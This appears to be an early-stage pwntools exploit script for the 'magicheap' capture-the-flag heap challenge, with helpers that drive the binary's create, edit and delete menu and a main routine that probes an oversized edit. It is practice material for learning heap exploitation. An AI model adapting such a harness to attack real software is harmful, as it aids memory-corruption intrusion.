from pwn import*

context(arch='amd64',os='linux')
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']

r = process('./magicheap')
elf = ELF('./magicheap')
#libc = elf.libc

def info_log():
    log.info('create_heap : main + 173')
    log.info('edit_heap : main + 185')
    log.info('delete_heap : main + 197')

    pause()

def create(size,content):
    r.sendlineafter('choice :','1')
    r.sendlineafter('Heap : ',str(size))
    r.sendlineafter('heap:',str(content))
    r.recvuntil('SuccessFul\n')

    pause()

def edit(idx,size,content):
    r.sendlineafter('choice :','2')
    r.sendlineafter('Index :',str(idx))
    r.sendlineafter('Heap : ',str(size))
    r.sendlineafter('heap : ',str(content))
    r.recvuntil('Done !\n')

    pause()

def delete(idx):
    r.sendlineafter('choice :','3')
    r.sendlineafter('Index :',str(idx))
    r.recvuntil('Done !\n')
    
    pause()
def main():
    create(16,'A')
    edit(0,32,'BBBB')
    delete(0)

if __name__ == '__main__':
    main()
